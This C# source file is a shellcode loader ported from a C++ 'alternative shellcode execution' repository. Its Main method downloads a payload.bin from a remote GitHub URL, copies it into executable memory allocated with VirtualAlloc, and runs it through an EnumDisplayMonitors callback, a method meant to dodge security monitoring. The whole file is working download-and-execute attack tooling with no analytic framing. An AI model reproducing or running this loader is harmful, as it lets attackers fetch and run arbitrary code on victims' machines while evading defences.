
//Alternative code exec. from c---> c# https://github.com/aahmad097/AlternativeShellcodeExec/blob/master/EnumDisplayMonitors/EnumDisplayMonitors.cpp
using System.Net;
using System.Runtime.InteropServices;

namespace EnumDisplay
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
        // Import the EnumDisplayMonitors function from the User32.dll library
        [DllImport("user32.dll")]
        static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, EnumMonitorsDelegate lpfnEnum, IntPtr dwData);

        // Define a delegate for the EnumDisplayMonitors function
        delegate bool EnumMonitorsDelegate(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        // Define a structure for the RECT type
        [StructLayout(LayoutKind.Sequential)]
        struct RECT
        {
            public int left, top, right, bottom;
        }

        static void Main(string[] args)
        {
            // Create a WebClient instance to download the .bin file
            using (WebClient webClient = new WebClient())
            {
                // Download the .bin file as a byte array
                byte[] shellcode = webClient.DownloadData("https://github.com/kyle41111/RedTeamHelp/raw/main/payload.bin");

                // Allocate memory for the shellcode with VirtualAlloc
                IntPtr address = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x1000, 0x40);
                Marshal.Copy(shellcode, 0, address, shellcode.Length);

                // Set up a delegate for the EnumDisplayMonitors function
                EnumMonitorsDelegate callback = (IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
                {
                    // Cast the address of the shellcode to a delegate and invoke it
                    ((Action)Marshal.GetDelegateForFunctionPointer(address, typeof(Action)))();
                    return false; // Stop enumerating monitors after the first one
                };

                // Invoke the EnumDisplayMonitors function with the callback delegate
                EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, callback, IntPtr.Zero);
                Thread.Sleep(Timeout.Infinite);
            }
        }
    }
}
